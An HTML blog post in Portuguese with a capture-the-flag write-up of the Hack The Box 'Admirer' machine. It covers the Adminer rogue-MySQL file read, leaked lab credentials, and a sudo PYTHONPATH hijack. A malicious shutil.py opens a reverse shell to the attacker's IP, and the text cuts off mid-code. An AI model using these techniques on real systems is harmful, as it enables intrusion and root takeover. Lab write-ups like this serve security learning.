@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>Writeup Admirer | Dark-Shellcode</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <link rel="shortcut icon" href="/images/favicon.jpg">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <h1 class="">Dark-Shellcode</h1>
+    <p>
+    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"CorvodaMorte"</span>;
+    </p>
+    <p>
+    printf(<a href="https://github.com/darkshellcode" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
+    </p>
+    <p>
+    printf(<span class="string">"<span class="reserved">%s\x40</span>corvodamorte@protonmail<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,nick);
+    </p>
+    <!-- <p>
+            printf(<a href="https://darkshellcode.github.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.github.com<span class="reserved">\n</span>"</span></a>,nick);
+        </p> -->
+    <p>
+    puts(<a href="//" target="_blank"><span class="string">"64 61 72 6b 73 68 65 6c 6c 63 6f 64 65"</span></a>);
+    </p>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">home</a></li>
+          <li><a href="/blog/">blog</a></li>
+          <li><a href="/projetos">projetos</a></li>
+          <li><a href="/writeup">writeup</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>Writeup Admirer</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Sep 29, 2020
+        
+        
+        •
+        <span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#ctf" class="reserved">ctf</a>,</span><span><a href="/category/#hacking" class="reserved">hacking</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <p><img src="/images/writeup/admirer/admirer.png" alt="" />
+<br />
+<br /><br /></p>
+<h3 id="ip-101010187">IP: 10.10.10.187</h3>
+
+<p><em>Essa foi uma máquina que me tomou bastante tempo. rss</em></p>
+
+<p>Comecei realizando um scan de portas com nmap para descobrir quais serviços então rodando.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.10.10.187
+Host is up <span class="o">(</span>0.33s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE    VERSION
+21/tcp open  ftp        vsftpd 3.0.3
+22/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  tcpwrapped
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p><br />
+Aqui vemos que temos a porta 21 com serviço de FTP rodando podemos realizar uma conexão para verificar se permite logar como anonymous.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connected to 10.10.10.187.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.187:kali<span class="o">)</span>: anonymous
+530 Permission denied.
+ftp: Login failed.
+ftp&gt;
+</code></pre></div></div>
+<p><br />
+Notamos que não aceita logar como anonymous, teremos que ter credenciais válidas.</p>
+
+<p>Então fui verificar a porta 80 para ver o que está rodando no serviço e verifiquei que é somente uma página com varias imagens, então verificando o robos.txt temos a seguinte informação.
+<br /></p>
+
+<p><em>http://10.10.10.187/robots.txt</em></p>
+
+<p><img src="/images/writeup/admirer/robots.txt.png" alt="" />
+<br />
+<br />
+Aqui observamos que temos um possível usuário chamado <strong>waldo</strong>, podemos testar o usuário para tentar realizar um acesso por ftp.</p>
+
+<p>No <em>robots.txt</em> temos uma mensagem dizendo que tem um diretorio com nome /admin-dir e que contem os contatos pessoais e credenciais, ótimo agora tentamos acessar para ver o que retorna.</p>
+
+<p>Infelizmente ao acessar o <em>http://10.10.10.187/admin-dir/</em> descobrimos que não termos permissão, então significa que teremos que descobrir qual diretorio dentro do /admin-dir tem os contatos e credenciais.
+<br /><br /></p>
+
+<p><img src="/images/writeup/admirer/403.png" alt="" />
+<br /><br /></p>
+
+<p>Aparentemente quem criou essa máquina queria que ela fosse ownada sem uso de tools comuns como dirb, dirbuster etc. e a enumeração sendo realizada de forma manual, utilizando ferramentas e wordlists nada é encontrado dentro de /admin-dir.</p>
+
+<p>Aqui perdi bastante tempo, na página do site tinha somente imagens e o  codigo fonte não tinha nada de interessante, no serviço de ssh não temos credenciais ainda e o dir ou gobuster não adianta. Então resolvi tentar acessar por FTP com usuario waldo que descobrimos no robots.txt.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connected to 10.10.10.187.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.187:corvo<span class="o">)</span>: waldo
+530 Permission denied.
+ftp: Login failed.
+ftp&gt;
+</code></pre></div></div>
+<p><br />
+Interessante, ele nem chega a pedir a senha retorna direto uma mensagem de permissão negada.
+Então pensei que provavelmente deve ter algum tipo de whitelist onde somente usuários setado pelo administrador do sistema é permitido realizar um acesso por FTP.</p>
+
+<p>Voltando para analisar a mensagem no robots.txt o que geralmente não é comum ter mensagens nesse arquivo, analisando a mensagem tentei usar algumas palavras para acessar algo dentro do admin-dir.</p>
+
+<p>Então pensei em tentar o /dmir-dir/contacts/ mas não retornou nada, então coloquei um txt e para minha surpresa retornou os contatos.</p>
+
+<p><br /><br />
+http://10.10.10.187/admin-dir/contacts.txt</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre></div></div>
+<p><br />
+Ótimos agora já temos alguns usuários mas não temos as senhas que provavelmente se encontra em um outro arquivo, então fui testar os usuário no FTP para ver se algum deles tinha permissão de acessar o serviço FTP pedindo para inserir a senha mas todos retornaram acesso não permitido.</p>
+
+<p>No texto do <em>robots.txt</em> é mencionado também sobre credenciais, se elas não estavam contidas dentro do <em>contacts.txt</em> então devem estar em algum arquivo dentro do /admin-dir, depois de um tempo descobri o nome do arquivo como <em>credentials.txt</em> e dentro dele finalmente as credenciais tanto esperada. :)</p>
+
+<p><br /></p>
+
+<p>http://admirer.htb/admin-dir/credentials.txt</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre></div></div>
+<p><br /><br />
+Agora temos algumas credenciais como wordpress e a tão esperada senha do FTP :).</p>
+
+<p>Acessando FTP descobrimos  duas coisas interessante, um <em>dump.sql</em> e um provável backup do site html.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connected to 10.10.10.187.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.187:corvo<span class="o">)</span>: ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0            3405 Dec 02 21:24 dump.sql
+<span class="nt">-rw-r--r--</span>    1 0        0         5270987 Dec 03 21:20 html.tar.gz
+226 Directory send OK.
+ftp&gt; 
+</code></pre></div></div>
+<p><br />
+No <em>dump.sql</em> não tinha nada de interessante então fui analisar o backup do html.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drwxr-x--- 6 corvo corvo 4096 jun  6  2019 assets
+drwxr-x--- 4 corvo corvo 4096 dez  2 17:29 images
+<span class="nt">-rw-r-----</span> 1 corvo corvo 4613 dez  3 17:20 index.php
+<span class="nt">-rw-r-----</span> 1 corvo corvo  134 dez  1 18:31 robots.txt
+drwxr-x--- 2 corvo corvo 4096 dez  2 14:50 utility-scripts
+drwxr-x--- 2 corvo corvo 4096 dez  2 14:25 w4ld0s_s3cr3t_d1r
+</code></pre></div></div>
+<p><br /><br /><br />
+Analisando o conteúdo do <em>index.php</em> encontramos uma credencial do banco de dados.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"]F7jLHw:*G&gt;UPrTo}~A"</span><span class="nx">d6b</span><span class="s2">";
+</span><span class="nv">$dbname</span><span class="s2"> = "</span><span class="nx">admirerdb</span><span class="s2">";
+</span></code></pre></div></div>
+<p><br />
+Dentro do diretório <em>utility-scripts</em> temos.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-rw-r-----</span> 1 corvo corvo 1795 dez  2 14:48 admin_tasks.php
+<span class="nt">-rw-r-----</span> 1 corvo corvo  401 dez  1 19:28 db_admin.php
+<span class="nt">-rw-r-----</span> 1 corvo corvo   20 nov 29 16:32 info.php
+<span class="nt">-rw-r-----</span> 1 corvo corvo   53 dez  2 14:40 phptest.php
+</code></pre></div></div>
+<p><br />
+Olhando o conteúdo do <em>admin_tasks.php</em> encontrei o que talvez seja um possível vetor de ataque.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"&lt;br /&gt;"</span><span class="p">,</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"/opt/scripts/admin_tasks.sh </span><span class="nv">$task</span><span class="s2"> 2&gt;&amp;1"</span><span class="p">));</span>
+</code></pre></div></div>
+<p><br /><br />
+Acessando o arquivo pelo navegador no diretório utility-scripts/admin_tasks.php temos.
+<br /><br />
+<img src="/images/writeup/admirer/tasks.png" alt="" />
+<br /><br />
+Clicando para exibir a lista de task temos:
+<br /><br />
+<img src="/images/writeup/admirer/tasks-lista.png" alt="" />
+<br /><br />
+Vemos que as tasks de <strong>Backup</strong>  estão desabilitados, então vamos analisar os habilitados e ver o que fazem.</p>
+
+<ul>
+  <li><strong>UPTIME</strong></li>
+</ul>
+
+<p><img src="/images/writeup/admirer/uptime.png" alt="" />
+<br /><br /></p>
+<ul>
+  <li><strong>LOGGED IN USERS</strong>
+<br /><br />
+<img src="/images/writeup/admirer/logged.png" alt="" /></li>
+</ul>
+
+<p><br /><br /></p>
+
+<ul>
+  <li><strong>CRONTAB</strong></li>
+</ul>
+
+<p><img src="/images/writeup/admirer/crontab.png" alt="" />
+<br /><br />
+Observando vemos que dentro do <em>admin_tasks.sh</em> ele provavelmente executa comandos do linux, para verificar as tasks desabilitada utilizei o burp.</p>
+
+<p>Analisando a requisição da task observamos que as tasks são definidas por um número, no caso o uptime é representada pelo numero 1.
+<br /><br />
+<img src="/images/writeup/admirer/request-1.png" alt="" />
+<br /><br />
+Seguindo a sequência os backup seriam entre as task <strong>4</strong> e <strong>7</strong>, fazendo requisição para eles no burp obtive:
+<br /><br />
+<img src="/images/writeup/admirer/task-bkp.png" alt="" />
+<br /><br />
+Recebemos a mensagem de privilégios insuficiente provavelmente porque são tarefas que precisam ser executadas com privilegio de root.</p>
+
+<p>Voltando aos arquivos de backup do html e analisando agora o arquivo <em>db_admin.php</em> temos mais uma credencial de banco de dados de waldo.</p>
+
+<p><br /><br /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"Wh3r3_1s_w4ld0?"</span><span class="p">;</span>
+</code></pre></div></div>
+<p><br />
+<em>Analisando os outros arquivos não encontrei nada de interessante.</em></p>
+
+<p>Então tentei conectar no serviço de <em>SSH</em> utilizando as duas credenciais que foram encontrada anteriormente em <em>index.php</em> e <em>db_admin.php</em> com o usuário waldo mas não eram válidas.</p>
+
+<p>Aqui perdi mais um tempo até pesquisar o nome da máquina <strong>admirer</strong> no google já que geralmente o nome da máquina tem algo ligado com exploração dela e o google me retornou uma dica.
+<br /><br />
+<img src="/images/writeup/admirer/google.png" alt="" />
+<br /><br />
+Pesquisando agora sobre adminer, achei uma falha utilizando mysql, mas para isso precisaria acessar a página da aplicação <strong>adminer</strong> então tentei <em>adminer.php</em> e ai está.</p>
+
+<p>http://10.10.10.187/utility-scripts/adminer.php
+<br /><br />
+<img src="/images/writeup/admirer/adminer-login.png" alt="" />
+<br /><br />
+Parece algum tipo de aplicação para gerenciar banco de dados tipo phpmyadmin entao tentei acessar o banco do servidor utilizando as credenciais que peguei no <em>index.php</em> e <em>db_admin.php</em>.</p>
+
+<p><img src="/images/writeup/admirer/admin-teste.png" alt="" />
+<br /><br />
+Infelizmente recebo acesso negado para user waldo, o mesmo ocorre com ambas as senhas.
+<br /><br />
+<img src="/images/writeup/admirer/adminer-erro.png" alt="" />
+<br /><br />
+Pesquisando no google descobre que tem uma falha onde basicamente o <em>adminer</em> permite realizar uma conexão em um banco de dados remoto e realizar uma pesquisa de um arquivo local do server e armazenar o resultado da consulta em uma tabela dentro do nosso banco.</p>
+
+<p>Obs. <em>Ficará mais simples ao ver na prática.</em></p>
+
+<p>Para isso teremos que realizar alguns passos:</p>
+
+<ul>
+  <li>Configurar um servidor mysql em nossa maquina local para o server adminer se conectar.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">ALTER</span> <span class="k">USER</span> <span class="s1">'root'</span><span class="o">@</span><span class="s1">'localhost'</span> <span class="n">IDENTIFIED</span> <span class="k">BY</span> <span class="s1">'root'</span><span class="p">;</span>
+<span class="n">FLUSH</span> <span class="k">PRIVILEGES</span><span class="p">;</span>
+<span class="k">grant</span> <span class="k">all</span> <span class="k">privileges</span> <span class="k">on</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">to</span> <span class="s1">'root'</span><span class="o">@</span><span class="s1">'%'</span> <span class="n">identified</span> <span class="k">by</span> <span class="s1">'root'</span><span class="p">;</span>
+</code></pre></div></div>
+<p><br />
+O que foi feito basicamente é adicionar a senha root para usuario root logo após dando flush para atualizar as mudanças, e logo em seguida dando privilégios para acesso remoto assim o servidor adminer poderá acessar nosso banco de dados mysql remotamente.</p>
+
+<p>Criei um banco chamado <strong>htb</strong>.</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">database</span> <span class="n">htb</span><span class="p">;</span>
+<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">028</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+<p><br /></p>
+<ul>
+  <li>Fazer adminer acessar o nosso banco de dados local.
+<img src="/images/writeup/admirer/adminer-mysql.png" alt="" />
+<br /><br />
+Finalmente recebemos a conexão do adminer em nosso banco mysql.
+<br /><br />
+<img src="/images/writeup/admirer/adminer-ok.png" alt="" />
+<br /><br /></li>
+</ul>
+
+<p>Criei uma tabela no banco de nome <strong>admirer</strong> e a conluna <strong>consulta</strong> com <em>varchar 255</em> para armazenar nossas consultas e ficar melhor de visualizar.</p>
+
+<p><img src="/images/writeup/admirer/tabela.png" alt="" />
+<br /><br /></p>
+<ul>
+  <li>Realizar um comando para carregar o conteúdo do arquivo local <em>/var/www/html/index.php</em> e inserir o resultado dentro da tabela <em>admirer</em> criado anteriormente.</li>
+</ul>
+
+<p><strong>E recebemos consulta executada.</strong>
+<br /><br />
+<img src="/images/writeup/admirer/infile.png" alt="" />
+<br /><br />
+Verificando conteúdo da nossa tabela com um <em>SELECT * FROM admirer</em> obtemos.
+<br /><br />
+<img src="/images/writeup/admirer/select.png" alt="" />
+<br /><br />
+Analisando o resultado da consulta do <em>index.php</em> armazenada dentro de nossa tabela encontramos novas credenciais.
+<br /><br />
+<img src="/images/writeup/admirer/resultado.png" alt="" />
+<br /><br />
+Obs (<em>Antes de prosseguir só por curiosidade também poderiamos realizar a consulta localmente.</em>)</p>
+
+<p>Verificando quais banco de dados existem, vemos que existe o banco de criamos HTB.
+<br /><br />
+<img src="/images/writeup/admirer/mysql.png" alt="" />
+<br /><br />
+Então coloquei para usar o banco “htb” e mando exibir quais as tabelas nele existente e vemos a tabela <strong>admirer</strong> criado anteriormente. Obs(<em>Também poderiamos ter criado banco e tabela tudo localmente ou no modo web como feito aqui.</em>).</p>
+
+<p>E finalmente executei o <em>select * from admirer</em>, para exibir tudo dentro da tabela <strong>admirer</strong> como feito via web.</p>
+
+<p><img src="/images/writeup/admirer/select-1.png" alt="" />
+<br /><br />
+E como vemos teremos o mesmo conteúdo e as credenciais já que como explicado o <em>Adminer</em> está conectado em nosso banco de dados local ele salvou dentro de nossa tabela.
+<br /><br />
+<img src="/images/writeup/admirer/mysql-creds.png" alt="" />
+<br /><br />
+Agora utlizando essa credencial para acessar o banco do adminer não teremos nada de interessante, mas com a mesma senha iremos conseguir acessar via SSH com usuario waldo. <strong>:)</strong></p>
+
+<p>Finalmente acesso ao servidor, só pegar flag user.
+<br /><br />
+<img src="/images/writeup/admirer/user.txt.png" alt="" />
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+drwxr-x--- 3 waldo waldo 4096 Apr 29 11:18 <span class="nb">.</span>
+drwxr-xr-x 9 root  root  4096 Dec  2 17:11 ..
+lrwxrwxrwx 1 waldo waldo    9 Nov 29 22:35 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 waldo waldo  220 Nov 29 18:44 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 waldo waldo 3526 Nov 29 18:44 .bashrc
+lrwxrwxrwx 1 waldo waldo    9 Dec  2 17:34 .lesshst -&gt; /dev/null
+lrwxrwxrwx 1 waldo waldo    9 Nov 29 22:35 .mysql_history -&gt; /dev/null
+drwxr-xr-x 2 waldo waldo 4096 Apr 29 10:57 .nano
+<span class="nt">-rw-r--r--</span> 1 waldo waldo  675 Nov 29 18:44 .profile
+<span class="nt">-rw-r-----</span> 1 root  waldo   33 May 18 21:32 user.txt
+
+waldo@admirer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+6938b<span class="k">*****</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<p><em>Agora teremos que conseguir um privesc e escalar nosso privilégio, o que custou muito tempo porque mesmo eu sabendo qual seria o vetor de ataque e como seria a exploração dessa falha em teoria, a forma que teria que ser feito eu não imaginava.</em></p>
+
+<p>Primeira coisa que faço quando consigo shell em uma máquina é verificar se tenho algum acesso privilegiado através do com sudo.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo: 
+Matching Defaults entries <span class="k">for </span>waldo on admirer:
+    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always
+
+User waldo may run the following commands on admirer:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
+</code></pre></div></div>
+<p><br />
+Aqui descubro que aquele script do <em>admin_tasks</em> verificado anteriormente com burp que não executava as taks 4 a 7 por falta de permissão aqui provavelmente com sudo irá funcionar, temos que analisar o script e ver como ele se comporta agora que temos shell na maquina.</p>
+
+<p>Olhando o codigo acho uma chamada para um programa em python.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>backup_web<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
+        /opt/scripts/backup.py &amp;
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p><br />
+Listando o o diretorio onde está o <em>admin_tasks.sh</em> temos o arquivo <em>backup.py</em> mas não temos permissão de escrita em nenhum dos dois.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x 2 root admins 4096 Dec  2 20:36 <span class="nb">.</span>
+drwxr-xr-x 3 root root   4096 Nov 30 06:23 ..
+<span class="nt">-rwxr-xr-x</span> 1 root admins 2613 Dec  2 20:36 admin_tasks.sh
+<span class="nt">-rwxr-----</span> 1 root admins  198 Dec  2 20:36 backup.py
+</code></pre></div></div>
+<p><br />
+Analisando o <em>backup.py</em> vejo que ele importa uma biblioteca chamada <strong>shutil</strong>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>
+<span class="n">src</span> <span class="o">=</span> <span class="s">'/var/www/html/'</span>
+<span class="c1"># old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+</span><span class="n">dst</span> <span class="o">=</span> <span class="s">'/var/backups/html'</span>
+<span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s">'gztar'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
+</code></pre></div></div>
+<p><br />
+Já que não podemos alterar nenhum dos arquivos para uma conexão reversa por falta de permissão pensei em uma falha chamada de <strong>Hijacking Library</strong> no Python, então tentei verificar os path do python para ver se conseguia inserir uma <strong>evil library</strong> para ele importar no lugar do <em>shutil</em> original.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer:/opt/scripts<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import sys; print(sys.path)"</span>
+<span class="o">[</span><span class="s1">''</span>, <span class="s1">'/usr/lib/python35.zip'</span>, <span class="s1">'/usr/lib/python3.5'</span>, <span class="s1">'/usr/lib/python3.5/plat-x86_64-linux-gnu'</span>, <span class="s1">'/usr/lib/python3.5/lib-dynload'</span>, <span class="s1">'/usr/local/lib/python3.5/dist-packages'</span>, <span class="s1">'/usr/lib/python3/dist-packages'</span><span class="o">]</span>
+</code></pre></div></div>
+<p><br />
+Analisando todos os diretorio não tinha permissão para nenhum deles, mas podemos adicionar mais um caminho no PATH.</p>
+
+<p>Criei um diretorio <em>privesc</em> no <strong>/tmp</strong> para colocar nossa biblioteca maliciosa e adicionei esse diretório no <em>PYTHONPATH</em>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /tmp/privesc
+<span class="nb">export </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/privesc
+</code></pre></div></div>
+<p><br />
+Verificando novamente:
+<br /><br />
+<img src="/images/writeup/admirer/pythonpath.png" alt="" />
+<br /><br />
+Agora que adicionamos nosso diretório no PATH dentro dele crio um library shutil malicioso que irá realizar um reverse shell quando o <em>backup.py</em> tentar importar a biblioteca <em>shutil</em>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shutil</span><span class="o">.</span><span class="n">py</span>
+
+<span class="c1">#!/bin/python3
+</span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">pty</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">lhost</span> <span class="o">=</span> <span class="s">"10.10.14.183"</span>
+<span class="n">lport</span> <span class="o">=</span> <span class="mi">4444</span>
+
+<span class="k">def</span> <span class="nf">make_archive</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">destination</span><span class="p">):</span>
+        <span class="n">base</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">destination</span><span class="p">)</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">format</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">archive_from</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">source</span><span class="p">)</span>
+        <span class="n">archive_to</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">source</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">sep</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">destination</span><span class="p">,</span> <span class="n">archive_from</span><span class="p">,</span> <span class="n">archive_to</span><span class="p">)</span>
+        <span class="n">shutil</span><span class="o">.</span><span class="n">make_archive</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">format</span><span class="p">,</span> <span class="n">archive_from</span><span class="p">,</span> <span class="n">archive_to</span><span class="p">)</span>
+        <span class="n">shutil</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">s.</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="nb">format</span><span class="p">),</span> <span class="n">destination</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
